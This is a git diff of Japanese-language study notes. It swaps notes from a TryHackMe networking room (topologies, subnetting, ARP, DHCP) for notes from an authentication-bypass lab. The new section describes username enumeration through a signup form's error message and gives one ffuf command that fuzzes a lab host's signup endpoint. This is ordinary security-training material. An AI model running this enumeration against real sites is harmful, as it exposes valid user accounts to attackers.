@@ -1,46 +1,9 @@
-# TryHackMe - Intro to LAN
-[https://tryhackme.com/room/introtolan](https://tryhackme.com/room/introtolan)
+# TryHackMe - Authentication Bypass
+[https://tryhackme.com/room/authenticationbypass](https://tryhackme.com/room/authenticationbypass)
 
-## Introducing LAN Topologies
-- Star Topology
-  - スイッチやハブガ中央のデバイスを経由する
-  - 拡張性が高い反面、費用も大きめで規模が大きくなると管理しづらい
-- バストポロジー
-  - バックボーンテーブルと呼ばれる一つのケーブルにそれぞれのデバイスをつなぐ
-  - 同時に要求があるとリソースが枯渇しやすく、通信が全て同じケーブルを通るのでトラブルを見つけづらい
-  - 費用は安く導入しやすい
-- リングトポロジー
-  - 全てんデバイスをケーブルで繋いでいる。
-  - 必要なケーブルが少ない、一つのケーブルが切れると全てのアクセスが死ぬ
-  - 
-- スイッチ
-  - 全てのデバイスを繋いでいるデバイス
-  - 繋がっているデバイスはポートで管理されており、通信を受けたら適切な宛先ポートに振り分ける
-  - MACアドレスで判断
-- ルーター
-  - 
+## ユーザ名列挙
+- 新規作成フォームで既に存在するユーザ名のエラーが出るのを利用して登録されているユーザを列挙する
 
-## A Primer on Subnetting
-- サブネット
-  - プライベートネットワークの中で領域を分ける
-- ネットネットワークアドレス
-  - どのネットワークに存在するかを示す。
-  - 192.168.1.100の 192.168.1.0
-- ホストアドレス
-  - ネットワークのどのホストに存在するか
-  - 192.168.1.100の100のぶぶん
-  - 255.255.255.0で後ろ3桁がホストを示す
-- デフォルトゲートウェイ
-  - 他のネットワークへ通信するための出口
-  - 192.168.1.254などの最後尾のホストを示す
-
-## ARP
-- ネットワーク上のIPアドレスとMACアドレスをマッピングして管理するするテクノロジー
-- ARP要求を行うと、該当のIPアドレスのMACを返してほしい、をブロードキャスト
-- 該当のやつだけ帰ってくる
-
-## DHCP
-- デバイスをネットワークに繋げた時、その中で使用できるIPアドレスを探す必要がある
-- DSCPサーバがやってくれるわけだがそもそもそこと通信しないと始まらないので、まずDHCPサーバを探すためのDHCP Discoverが送られる
-- 見つかるとDSCPサーバにIP割り当てを要求、DHCPサーバはDHCPリクエストをブロードキャストし使えるIPを選択
-- それをレスポンスすることでIP付与完了
+```
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.48.216/customers/signup -mr "username already exists"
+```
